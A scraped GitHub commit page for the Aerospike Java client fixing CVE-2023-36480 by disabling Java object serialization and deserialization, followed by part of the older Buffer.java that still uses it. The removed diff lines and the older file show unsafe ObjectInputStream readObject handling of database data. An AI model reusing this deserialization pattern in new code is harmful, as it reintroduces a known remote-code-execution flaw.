=== Content from github.com_6dcc9e8a_20250110_224552.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F51c65e32837da29435161a2d9c09bbdc2071ecae)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F51c65e32837da29435161a2d9c09bbdc2071ecae)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Commit

[Permalink](/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[CVE-2023-36480](https://github.com/advisories/GHSA-jj95-55cr-9597 "CVE-2023-36480") CLIENT-2252 DIsable java runtime serialization/deseria…

[Browse files](/aerospike/aerospike-client-java/tree/51c65e32837da29435161a2d9c09bbdc2071ecae)
Browse the repository at this point in the history

```
…lization.

Deserialization of java runtime serialized objects has been identified as a security risk by
CodeQL team members [@atorralba](https://github.com/atorralba) (Tony Torralba) and [@joefarebrother](https://github.com/joefarebrother) (Joseph Farebrother).

All existing database objects that are serialized using this serialization format will need to
be converted to a safer format (Aerospike native types, protobuf, msgpack, json, xml ...) using
a previous client version.
```

* Loading branch information

[![@BrianNichols](https://avatars.githubusercontent.com/u/1761530?s=40&v=4)](/BrianNichols)

[BrianNichols](/aerospike/aerospike-client-java/commits?author=BrianNichols "View all commits by BrianNichols")
committed
Aug 7, 2023

1 parent
[4205a8a](/aerospike/aerospike-client-java/commit/4205a8a036a7fbe6eaa692d3dded5b6c52b8c07f)

commit 51c65e3

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**9 additions**
and
**49 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* client/src/com/aerospike/client

  + client/src/com/aerospike/client/Value.java
    [Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc)
  + command

    - client/src/com/aerospike/client/command/Buffer.java
      [Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77)
  + util

    - client/src/com/aerospike/client/util/Packer.java
      [Packer.java](#diff-358b093e614cf440721800580d512243f494f11224161e28bee19d59a3256396)
    - client/src/com/aerospike/client/util/Unpacker.java
      [Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625)

## There are no files selected for viewing

14 changes: 1 addition & 13 deletions

14
[client/src/com/aerospike/client/Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc "client/src/com/aerospike/client/Value.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/51c65e32837da29435161a2d9c09bbdc2071ecae/client/src/com/aerospike/client/Value.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,8 +16,6 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client; |
|  |  |  |
|  |  | import java.io.ByteArrayOutputStream; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.Arrays; |
|  |  | import java.util.List; |
| Expand Down  Expand Up | | @@ -1153,17 +1151,7 @@ public BlobValue(Object object) { |
|  |  |  |
|  |  | @Override |
|  |  | public int estimateSize() throws AerospikeException.Serialize { |
|  |  | try { |
|  |  | ByteArrayOutputStream bstream = new ByteArrayOutputStream(); |
|  |  | ObjectOutputStream ostream = new ObjectOutputStream(bstream); |
|  |  | ostream.writeObject(object); |
|  |  | ostream.close(); |
|  |  | bytes = bstream.toByteArray(); |
|  |  | return bytes.length; |
|  |  | } |
|  |  | catch (Exception e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | @Override |
| Expand Down | |  |

12 changes: 2 additions & 10 deletions

12
[client/src/com/aerospike/client/command/Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77 "client/src/com/aerospike/client/command/Buffer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/51c65e32837da29435161a2d9c09bbdc2071ecae/client/src/com/aerospike/client/command/Buffer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,13 +16,12 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.command; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.io.UnsupportedEncodingException; |
|  |  | import java.math.BigInteger; |
|  |  | import java.util.Arrays; |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.ResultCode; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.util.Unpacker; |
|  |  |  |
| Expand Down  Expand Up | | @@ -338,14 +337,7 @@ public static Object bytesToObject(byte[] buf, int offset, int length) |
|  |  | return null; |
|  |  | } |
|  |  |  |
|  |  | try { |
|  |  | ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length); |
|  |  | ObjectInputStream oistream = new ObjectInputStream(bastream); |
|  |  | return oistream.readObject(); |
|  |  | } |
|  |  | catch (Exception e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object deserializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | public static Value bytesToLongValue(byte[] buf, int offset, int len) { |
| Expand Down | |  |

24 changes: 4 additions & 20 deletions

24
[client/src/com/aerospike/client/util/Packer.java](#diff-358b093e614cf440721800580d512243f494f11224161e28bee19d59a3256396 "client/src/com/aerospike/client/util/Packer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/51c65e32837da29435161a2d9c09bbdc2071ecae/client/src/com/aerospike/client/util/Packer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,23 +16,21 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.util; |
|  |  |  |
|  |  | import java.io.ByteArrayOutputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import static com.aerospike.client.Value.MapValue.getMapOrder; |
|  |  |  |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.ArrayList; |
|  |  | import java.util.List; |
|  |  | import java.util.Map; |
|  |  | import java.util.Map.Entry; |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.ResultCode; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.cdt.MapOrder; |
|  |  | import com.aerospike.client.command.Buffer; |
|  |  | import com.aerospike.client.command.ParticleType; |
|  |  |  |
|  |  | import static com.aerospike.client.Value.MapValue.getMapOrder; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Serialize collection objects using MessagePack format specification: |
|  |  | \* |
| Expand Down  Expand Up | | @@ -208,21 +206,7 @@ public void packParticleBytes(byte[] b, int offset, int length) { |
|  |  | } |
|  |  |  |
|  |  | public void packBlob(Object val) { |
|  |  | ByteArrayOutputStream bstream = new ByteArrayOutputStream(); |
|  |  |  |
|  |  | try { |
|  |  | ObjectOutputStream ostream = new ObjectOutputStream(bstream); |
|  |  | ostream.writeObject(val); |
|  |  | ostream.close(); |
|  |  | } |
|  |  | catch (IOException ioe) { |
|  |  | throw new AerospikeException.Serialize(ioe); |
|  |  | } |
|  |  |  |
|  |  | byte[] bytes = bstream.toByteArray(); |
|  |  | packByteArrayBegin(bytes.length + 1); |
|  |  | packByte(ParticleType.JBLOB); |
|  |  | packByteArray(bytes, 0, bytes.length); |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | public void packGeoJSON(String val) { |
| Expand Down | |  |

8 changes: 2 additions & 6 deletions

8
[client/src/com/aerospike/client/util/Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625 "client/src/com/aerospike/client/util/Unpacker.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/51c65e32837da29435161a2d9c09bbdc2071ecae/client/src/com/aerospike/client/util/Unpacker.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,9 +16,7 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.util; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.AbstractMap; |
|  |  | import java.util.ArrayList; |
| Expand All | | @@ -30,6 +28,7 @@ |
|  |  | import java.util.TreeMap; |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.ResultCode; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.command.Buffer; |
|  |  | import com.aerospike.client.command.ParticleType; |
| Expand Down  Expand Up | | @@ -235,10 +234,7 @@ private T unpackBlob(int count) throws IOException, ClassNotFoundException { |
|  |  | break; |
|  |  |  |
|  |  | case ParticleType.JBLOB: |
|  |  | ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count); |
|  |  | ObjectInputStream oistream = new ObjectInputStream(bastream); |
|  |  | val = getJavaBlob(oistream.readObject()); |
|  |  | break; |
|  |  | throw new AerospikeException(ResultCode.SERIALIZE\_ERROR, "Object deserializer has been disabled"); |
|  |  |  |
|  |  | case ParticleType.GEOJSON: |
|  |  | val = getGeoJSON(Buffer.utf8ToString(buffer, offset, count)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `51c65e3`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F51c65e32837da29435161a2d9c09bbdc2071ecae) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_53858949_20250110_224549.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fcommand%2FBuffer.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fcommand%2FBuffer.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Files

 e40a49b
## Breadcrumbs

1. [aerospike-client-java](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315)
2. /[client](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client)
3. /[src](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src)
4. /[com](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com)
5. /[aerospike](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike)
6. /[client](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client)
7. /[command](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command)
/
# Buffer.java

Copy path Blame  Blame
## Latest commit

## History

[History](/aerospike/aerospike-client-java/commits/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java)624 lines (533 loc) · 16.3 KB e40a49b
## Breadcrumbs

1. [aerospike-client-java](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315)
2. /[client](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client)
3. /[src](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src)
4. /[com](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com)
5. /[aerospike](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike)
6. /[client](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client)
7. /[command](/aerospike/aerospike-client-java/tree/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command)
/
# Buffer.java

Top
## File metadata and controls

* Code
* Blame

624 lines (533 loc) · 16.3 KB[Raw](https://github.com/aerospike/aerospike-client-java/raw/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624/\* \* Copyright 2012-2022 Aerospike, Inc. \* \* Portions may be licensed to Aerospike, Inc. under one or more contributor \* license agreements WHICH ARE COMPATIBLE WITH THE APACHE LICENSE, VERSION 2.0. \* \* Licensed under the Apache License, Version 2.0 (the "License"); you may not \* use this file except in compliance with the License. You may obtain a copy of \* the License at http://www.apache.org/licenses/LICENSE-2.0 \* \* Unless required by applicable law or agreed to in writing, software \* distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \* WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \* License for the specific language governing permissions and limitations under \* the License. \*/package com.aerospike.client.command;
import java.io.ByteArrayInputStream;import java.io.ObjectInputStream;import java.math.BigInteger;import java.nio.charset.StandardCharsets;import java.util.Arrays;
import com.aerospike.client.AerospikeException;import com.aerospike.client.Value;import com.aerospike.client.util.Unpacker;import com.aerospike.client.util.Utf8;
public final class Buffer {
 public static Value bytesToKeyValue(int type, byte[] buf, int offset, int len) throws AerospikeException {
 switch (type) { case ParticleType.STRING: return Value.get(Buffer.utf8ToString(buf, offset, len));
 case ParticleType.INTEGER: return bytesToLongValue(buf, offset, len);
 case ParticleType.DOUBLE: return new Value.DoubleValue(Buffer.bytesToDouble(buf, offset));
 case ParticleType.BLOB: return Value.get(Arrays.copyOfRange(buf, offset, offset+len));
 default: return null; } }
 public static Object bytesToParticle(int type, byte[] buf, int offset, int len) throws AerospikeException {
 switch (type) { case ParticleType.STRING: return Buffer.utf8ToString(buf, offset, len);
 case ParticleType.INTEGER: return Buffer.bytesToNumber(buf, offset, len);
 case ParticleType.BOOL: return Buffer.bytesToBool(buf, offset, len);
 case ParticleType.DOUBLE: return Buffer.bytesToDouble(buf, offset);
 case ParticleType.BLOB: return Arrays.copyOfRange(buf, offset, offset+len);
 case ParticleType.JBLOB: return Buffer.bytesToObject(buf, offset, len);
 case ParticleType.GEOJSON: return Buffer.bytesToGeoJSON(buf, offset, len);
 case ParticleType.HLL: return Buffer.bytesToHLL(buf, offset, len);
 case ParticleType.LIST: return Unpacker.unpackObjectList(buf, offset, len);
 case ParticleType.MAP: return Unpacker.unpackObjectMap(buf, offset, len);
 default: return null; } }
 /\* private static Object parseList(byte[] buf, int offset, int len) throws AerospikeException { int limit = offset + len; int itemCount = Buffer.bytesToInt(buf, offset); offset += 4; ArrayList<Object> list = new ArrayList<Object>(itemCount);
 while (offset < limit) { int sz = Buffer.bytesToInt(buf, offset); offset += 4; int type = buf[offset]; offset++; list.add(bytesToParticle(type, buf, offset, sz)); offset += sz; } return list; }
 private static Object parseMap(byte[] buf, int offset, int len) throws AerospikeException { Object key; Object value;
 int limit = offset + len; int n\_items = Buffer.bytesToInt(buf, offset); offset += 4; HashMap<Object, Object> map = new HashMap<Object, Object>(n\_items);
 while (offset < limit) { // read out the key int sz = Buffer.bytesToInt(buf, offset); offset += 4; int type = buf[offset]; offset++;
 key = bytesToParticle(type, buf, offset, len); offset += sz;
 // read out the value sz = Buffer.bytesToInt(buf, offset); offset += 4; type = buf[offset]; offset++;
 value = bytesToParticle(type, buf, offset, len); offset += sz;
 map.put(key, value); } return map; } \*/
 /\*\* \* Estimate size of Utf8 encoded bytes without performing the actual encoding. \*/ public static int estimateSizeUtf8(String s) { if (s == null || s.length() == 0) { return 0; } return Utf8.encodedLength(s); }
 public static byte[] stringToUtf8(String s) { if (s == null || s.length() == 0) { return new byte[0]; } int size = Utf8.encodedLength(s); byte[] bytes = new byte[size]; stringToUtf8(s, bytes, 0); return bytes; }
 /\*\* \* Convert input string to UTF-8, copies into buffer (at given offset). \* Returns number of bytes in the string. \* \* Java's internal UTF8 conversion is very, very slow. \* This is, rather amazingly, 8x faster than the to-string method. \* Returns the number of bytes this translated into. \*/ public static int stringToUtf8(String s, byte[] buf, int offset) { if (s == null) { return 0; } int length = s.length(); int startOffset = offset;
 for (int i = 0; i < length; i++) { int c = s.charAt(i); if (c < 0x80) { buf[offset++] = (byte) c; } else if (c < 0x800) { buf[offset++] = (byte)(0xc0 | ((c >> 6))); buf[offset++] = (byte)(0x80 | (c & 0x3f)); } else { // Encountered a different encoding other than 2-byte UTF8. Let java handle it. byte[] value = s.getBytes(StandardCharsets.UTF\_8); System.arraycopy(value, 0, buf, startOffset, value.length); return value.length; } } return offset - startOffset; }
 public static String utf8ToString(byte[] buf, int offset, int length) { // A Thread local implementation does not help here, so // allocate character buffer each time. if (length == 0) { return ""; }
 char[] charBuffer = new char[length]; int charCount = 0; int limit = offset + length; int origoffset = offset;
 while (offset < limit ) { int b1 = buf[offset];
 if (b1 >= 0) { charBuffer[charCount++] = (char)b1; offset++; } else if ((b1 >> 5) == -2) { int b2 = buf[offset + 1]; charBuffer[charCount++] = (char) (((b1 << 6) ^ b2) ^ 0x0f80); offset += 2; } else { // Encountered an UTF encoding which uses more than 2 bytes. // Use a native function to do the conversion. return new String(buf, origoffset, length, StandardCharsets.UTF\_8); } } return new String(charBuffer, 0, charCount); }
 public static String utf8ToString(byte[] buf, int offset, int length, StringBuilder sb) { if (length == 0) { return ""; }
 // This method is designed to accommodate multiple string conversions on the same // thread, but without the ThreadLocal overhead. The StringBuilder instance is // created on the stack and passed in each method invocation. sb.setLength(0); int limit = offset + length; int origoffset = offset;
 while (offset < limit ) { if ((buf[offset] & 0x80) == 0) { // 1 byte char c = (char) buf[offset]; sb.append(c); offset++; } else if ((buf[offset] & 0xE0) == 0xC0) { // 2 bytes char c = (char) (((buf[offset] & 0x1f) << 6) | (buf[offset+1] & 0x3f)); sb.append(c); offset += 2; } else { // Encountered an UTF encoding which uses more than 2 bytes. // Use a native function to do the conversion. return new String(buf, origoffset, length, StandardCharsets.UTF\_8); } } return sb.toString(); }
 /\*\* \* Convert UTF8 numeric digits to an integer. Negative integers are not supported. \* \* Input format: 1234 \*/ public static int utf8DigitsToInt(byte[] buf, int begin, int end) { int val = 0; int mult = 1;
